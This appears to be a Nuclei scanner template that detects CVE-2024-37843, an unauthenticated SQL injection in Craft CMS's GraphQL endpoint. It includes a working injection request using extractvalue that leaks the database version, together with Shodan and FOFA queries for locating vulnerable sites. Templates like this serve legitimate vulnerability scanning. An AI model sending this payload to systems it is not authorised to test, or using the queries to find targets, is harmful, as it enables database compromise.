http:
- matchers:
  - part: body
    type: word
    words:
    - 'General error: 1105 XPATH syntax error: ''\n{{matcher}}'
  - part: content_type
    type: word
    words:
    - application/json
  matchers-condition: and
  raw:
  - 'POST /api/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type:application/json


    {"query":"query  IntrospectionQuery  {assets(orderBy: \"`assets`.`volumeId`,extractvalue(1,concat(0x0a,concat(''{{matcher}}'',version())))
    --\", limit: 5){filename}}"}

    '
  skip-variables-check: true
id: CVE-2024-37843
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-37843
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99526
    epss-score: 0.89433
  description: 'Craft CMS up to v3.7.31 was discovered to contain a SQL injection
    vulnerability via the GraphQL API endpoint.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL queries via the GraphQL
    API endpoint, potentially compromising the database.

    '
  metadata:
    fofa-query:
    - body=craftcms
    - icon_hash=-47932290
    product: craft_cms
    publicwww-query: craftcms
    shodan-query:
    - cpe:"cpe:2.3:a:craftcms:craft_cms"
    - http.html:"craftcms"
    - http.favicon.hash:"-47932290"
    - 'X-Powered-By: Craft CMS'
    vendor: craftcms
  name: Craft CMS <=v3.7.31 - SQL Injection
  reference:
  - https://blog.smithsecurity.biz/craft-cms-unauthenticated-sqli-via-graphql
  - https://github.com/gsmith257-cyber/CVE-2024-37843-POC
  remediation: 'Update Craft CMS to a version later than v3.7.31.

    '
  severity: critical
  tags: cve,cve2024,craftcms,sqli,vuln
variables:
  matcher: '{{rand_base(4)}}'
